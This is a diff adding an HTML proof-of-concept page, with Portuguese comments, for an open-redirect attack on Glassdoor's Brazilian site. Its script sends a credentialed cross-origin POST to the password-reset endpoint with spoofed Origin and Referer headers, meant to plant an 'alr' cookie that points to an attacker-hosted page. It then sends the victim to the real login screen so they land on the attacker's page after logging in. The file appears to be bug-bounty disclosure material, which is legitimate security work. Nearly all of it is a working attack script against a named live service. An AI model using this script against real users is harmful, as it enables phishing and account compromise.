@@ -1,0 +1,29 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>Glassdoor Redirect PoC</title>
+<body>
+<h2>PoC – Open Redirect via Cookie <code>alr</code></h2>
+<p>Esta página simula o atacante: ao ser aberta, ela força o Glassdoor a definir o cookie <code>alr</code> com um valor externo.</p>
+
+<script>
+// URL externa para onde o usuário será redirecionado após login
+// Aqui usamos o próprio GitHub Pages do atacante como "evil.com"
+const attackerUrl = "https://SEU-USUARIO.github.io/SEU-REPO/after-login.html";
+
+// Dispara o POST para o Glassdoor com Origin/Referer falsos
+fetch("https://www.glassdoor.com.br/auth/account/password/forgot/initiate", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json",
+    "Origin": attackerUrl,
+    "Referer": attackerUrl
+  },
+  body: JSON.stringify({ emailAddress: "victim@example.com" }),
+  credentials: "include"
+}).then(() => {
+  // Depois que o Glassdoor setou o cookie alr=attackerUrl,
+  // redirecionamos a vítima para a tela de login oficial
+  window.location = "https://www.glassdoor.com.br/auth/login";
+});
+</script>
+</body>
